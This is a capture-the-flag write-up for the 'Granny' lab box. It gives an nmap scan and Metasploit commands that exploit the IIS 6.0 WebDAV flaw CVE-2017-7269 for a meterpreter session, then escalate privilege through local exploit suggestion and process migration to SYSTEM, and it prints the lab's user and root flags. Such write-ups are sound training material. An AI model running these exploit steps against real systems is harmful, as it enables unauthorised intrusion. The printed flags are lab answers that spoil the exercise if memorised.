
## CTF Writeup: Granny

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.234
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-21 13:43 -0500
Nmap scan report for 10.129.95.234
Host is up (0.030s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Mon, 21 Sep 2026 18:45:24 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.21 seconds
```

The TCP Scan revealed only port 80 being up and an very outdated IIS 6.0 Webservice. It also seems to be running webdav.

Since I've done Grandpa Lab previously I immediatly saw the duality of those boxes. I utilized the same exploit then for the Grandpa box using metasploit

```
msfconsole -q
search CVE-2017-7269
options
set LHOST tun0
set RHOSTS 10.129.95.234
exploit
```

This gave me an meterpreter session!

Unfortunately it was the same use-case like in the Grandpa Lab, in which there was an very outdated Windows Machine, which I couldn't manually exploit.

So I decided to background my current session, to run the local_exploit_suggester module again.

```
background
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit
```

This prompted a lot of exploits which are active for this server!

I decided to use the same one as I did in the grandpa lab.

```
use exploit/windows/local/ms10_015_kitrap0d
set LHOST tun0
set SESSION 1
exploit
```

Unfortunately it wasn't possible to exploit this again, due to access denied! Let's go back into the session and migrate into another process. This gave us another SYSTEM Shell.

```
sessions 1
migrate 2692
background
exploit
```

Retrieved user.txt in C:\Documents and Settings\Lakis\Desktop.

```
700c5dc163014e22b3e408f8703f67d1
```

Retrieved root.txt in C:\Documents and Settings\Administrator\Desktop.

```
aa4beed1c0584445ab463a6747bd06e9
```